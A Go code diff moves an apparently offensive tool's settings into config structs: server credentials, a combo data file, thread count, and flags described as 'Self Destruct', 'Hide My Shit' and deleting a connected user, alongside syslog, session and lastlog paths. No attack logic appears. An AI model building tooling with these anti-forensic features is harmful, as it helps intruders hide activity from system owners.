@@ -147,19 +147,54 @@ var SYSLOG string = "/var/log/syslog"
 
 var Sessions = "/run/systemd/sessions"
 
-var (
+// var (
+// 	BrFile        string
+var BrFileHomeDir string
+
+// 	Host          string /////
+// 	Port          string
+// 	User          string
+// 	Pass          string
+// 	ConnectedUser string
+// 	Threads       int
+// 	HideMe        bool
+// 	Combo         bool
+// 	Destr         bool
+// )
+
+type Config struct {
+	Server ServerConfig `toml:"server"`
+	Flags  AppFlags     `toml:"flags"`
+}
+
+type ServerConfig struct {
+	User string
+	Port string
+	Host string
+	Pass string
+}
+
+type AppFlags struct {
+	Destr         bool
+	Combo         bool
+	Hideme        bool
 	BrFile        string
-	BrFileHomeDir string
-	Host          string /////
-	Port          string
-	User          string
-	Pass          string
 	ConnectedUser string
 	Threads       int
-	HideMe        bool
-	Combo         bool
-	Destr         bool
-)
+}
+
+// flag.BoolVar(&vars.Destr, "d", false, "Self Destruct")
+// flag.BoolVar(&vars.Combo, "c", false, "Combo Entry")
+// flag.BoolVar(&vars.HideMe, "hm", true, "Hide My Shit")
+// flag.StringVar(&vars.BrFile, "f", "", "Data File")
+
+// flag.StringVar(&vars.ConnectedUser, "cu", "ubuntu", "Connected User To Delete")
+// flag.IntVar(&vars.Threads, "t", 3, "Threads")
 
 // const LASTLOG_FILE = "/var/log/lastlog"
 // const LINE_LENGTH = 292 // Size of each entry in lastlog (defined in /usr/include/lastlog.h)
+
+// flag.StringVar(&vars.User, "u", "", "Server Username")
+// flag.StringVar(&vars.Port, "p", "", "Server Port")
+// // flag.StringVar(&vars.Host, "h", "192.168.23.23", "Server Host")
+// flag.StringVar(&vars.Pass, "pa", "", "Server Pass")
